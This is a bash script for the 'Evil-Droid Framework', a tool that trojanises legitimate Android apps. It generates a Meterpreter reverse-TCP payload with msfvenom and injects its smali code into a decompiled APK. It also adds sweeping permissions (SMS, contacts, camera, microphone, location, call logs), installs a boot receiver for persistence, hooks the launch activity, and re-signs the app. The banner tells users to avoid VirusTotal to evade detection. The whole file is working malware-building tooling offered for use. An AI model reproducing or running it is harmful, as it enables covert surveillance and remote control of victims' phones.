#!/usr/bin/env bash
#
# Evil-Droid Framework . version 0.3
# Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platform
# 
#                  Created By Mascerano Bachir .
#                 Website: http://www.dev-labs.co
#           YTB : https://www.youtube.com/c/mascerano%20bachir  
#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
#Speciak thanks to : MrPedroubuntu , Kader Achraf , youcef yahia and Mohammed Yacine
#
# this is an open source tool if you want to modify or add something . Please give me a copy.

# resize terminal window
resize -s 40 70 > /dev/null
#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear
#Define options
path=`pwd`
lanip=`hostname -I`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
ver="v0.3"
APKTOOL="$path/tools/tools/apktool.jar"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
echo ""
sleep 1
# spinner for Metasploit Generator
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $red"[*] Stopping Services... "
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
exit
}
#detect system
clear
echo -e $blue
sudo cat /etc/issue.net
#check dependencies existence
echo -e $blue "" 
echo "® Checking dependencies configuration ®" 
echo "                                       " 
# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
echo -e $yellow "[ ! ] Installing Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] Done installing ...."
which msfconsole > /dev/null 2>&1
sleep 2
fi
#check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] xterm -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which xterm > /dev/null 2>&1
fi
#check if zenity is installed
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zenity -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Zenity "
sleep 2
echo -e $green ""
sudo apt-get install zenity -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which zenity > /dev/null 2>&1
fi
#Check for Android Asset Packaging Tool
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Aapt -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Aapt "
sleep 2
echo -e $green ""
sudo apt-get install aapt -y
sudo apt-get install android-framework-res -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which aapt > /dev/null 2>&1
fi
#Check for Apktool Reverse Engineering
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Apktool -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Apktool "
sleep 2
echo -e $green ""
sudo apt-get install apktool -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which apktool > /dev/null 2>&1
fi
#check for zipalign
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zipalign -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Zipalign "
sleep 2
echo -e $green ""
sudo apt-get install zipalign -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which zipalign > /dev/null 2>&1
fi
directory="$path/evilapk"
if [ ! -d "$directory" ]; then
	echo "Creating the output directory..."
	mkdir $directory
        sleep 3
fi
echo -e $red "╔────────────────────────────────────────────────╗"
echo -e $red "|    Evil-Droid Framework $ver - Dev-labs.co     |"
echo -e $red "|   Please do not upload APK to VirusTotal.com   |"
echo -e $red "┖────────────────────────────────────────────────┙"
#function ascii banner
function print_ascii_art {
echo -e $lightgreen "             .           .           "          
echo -e $lightgreen "             M.          .M          "     
echo -e $lightgreen "              MMMMMMMMMMM.           "     
echo -e $lightgreen "           .MMM\MMMMMMM/MMM.         "     
echo -e $lightgreen "          .MMM.7MMMMMMM.7MMM.        "     
echo -e $lightgreen "         .MMMMMMMMMMMMMMMMMMM        "     
echo -e $lightgreen "         MMMMMMM.......MMMMMMM       "     
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "     
echo -e $lightgreen "    MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "    MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  "   
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $lightgreen "             MMMMM   MMMMM  $ver     "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             .MMM.   .MMM.           " 
echo -e $lightgreen "     Mascerano Bachir - Dev-labs     "                                 
}
#function lhost
function get_lhost() 
{
  LHOST=$(cat tools/host.txt)
}
#function lport
function get_lport() 
{
  LPORT=$(cat tools/port.txt)
}
#function payload
function get_payload()
{
  PAYLOAD='android/meterpreter/reverse_tcp'
}
#function name
function payload_name()
{
 apk_name='fast'
}
#function original apk
function orig_apk()
{
 orig=$(cat tools/dir_apk.txt)
}
#function generate payload
function gen_payload()
{
 echo -e $yellow ""
 echo "[*] Generating apk payload"
 spinlong
 xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
#function update apktool
function up_apktook()
{
 echo -e $yellow ""
 echo "[*] Removing 1.apk framework file..."
 spinlong
 apktool empty-framework-dir --force > /dev/null 2>&1
}
#function apktool
function apk_decomp()
{
 echo -e $yellow ""
 echo "[*] Decompiling Payload APK..."
 spinlong
 xterm -T "Decompiling Payload" -e java -jar $APKTOOL d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
 rm $apk_name.apk
}
function apk_decomp1()
{
 echo -e $yellow ""
 echo "[*] Decompiling Original APK..."
 spinlong
 xterm -T "Decompiling Original" -e java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
}
function apk_comp1()
{
 echo -e $yellow ""
 echo "[*] Rebuilding Backdoored APK..."
 spinlong
 xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/original -o evil.apk > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
 rm -r original > /dev/null 2>&1
}
#function errors
function error()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 Failed to rebuild backdoored apk【X】"
   echo
   exit $rc
 fi
}
# function adding permission
function perms()
{
 echo -e $yellow ""
 echo "[*] Adding permission and Hook Smali"
 spinlong
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 android_nam=$tmp
}
# functions hook smali
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    spinlong
    echo -e $red ""
    echo "[x] cant find : $android_activity.smali"
    echo "[*] try another ..."
    spinlong
    sleep 2
    echo
    echo "##################################################################"
    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    echo "In line:$hook_num"
    echo "##################################################################"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi 
 fi
}
#function signing apk
function sign()
{
 echo -e $yellow ""
 echo "[*] Checking for ~/.android/debug.keystore for signing..."
 spinlong
 if [ ! -f ~/.android/debug.keystore ]; then
     echo -e $red ""
     echo " [ X ] Debug key not found. Generating one now..."
     spinlong
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e $lightgreen ""
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
 fi
 spinlong
 echo -e $yellow ""
 echo "[*] Attempting to sign the package with your android debug key"
 spinlong
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA evil.apk androiddebugkey > /dev/null 2>&1
 echo -e $yellow 
 echo "[*] Verifying signed artifacts..."
 spinlong
 jarsigner -verify -certs evil.apk > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Failed to verify signed artifacts"
   exit $rc
 fi
 echo -e $yellow
 echo "[*] Aligning recompiled APK..."
 spinlong
 zipalign 4 evil.apk $apk_name.apk 2>&1
 rc=$?
 echo -e $yellow
 echo "[✔] Done."
 spinlong
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Failed to align recompiled APK"
   exit $rc
 fi
 rm evil.apk > /dev/null 2>&1
}
#main menu
function main()
{
    
    print_ascii_art
    echo -e $green ""
    echo "╔──────────────────────────────────────────────╗"
    echo "|          Evil-Droid Framework $ver           |"
    echo "|      Hack & Remote android plateform         |"
    echo "┖──────────────────────────────────────────────┙"
    echo
    
    echo -e $lightgreen "[✔] BACKDOOR APK ORIGINAL (NEW)"
    echo -e $green
    get_lhost
    get_lport
    echo
    payload_name
    get_payload
    echo
    orig_apk
    echo
    spinlong
    gen_payload
    up_apktook
    apk_decomp1
    apk_decomp
    perms
    hook_smalies
    spinlong
    apk_comp1
    sign
    echo 
    mv $apk_name.apk $path/evilapk > /dev/null 2>&1
    error
    sleep 2
    echo
}
main